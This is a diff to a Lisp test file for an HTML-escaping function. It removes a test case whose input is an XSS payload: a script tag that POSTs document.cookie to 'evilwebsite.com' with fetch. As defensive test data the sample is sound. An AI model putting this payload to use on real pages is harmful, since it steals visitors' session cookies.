@@ -13,8 +13,4 @@
 
 (test escape-html-text-content
   (is (string= "&amp;&lt;&gt;&quot;&#x27;&#x2F;&grave;&#x3D;"
-               (escape-html-text-content "&<>\"'/`=")))
-  (is (string=
-       "&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;"
-       (escape-html-text-content
-        "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>" ))))
+               (escape-html-text-content "&<>\"'/`="))))
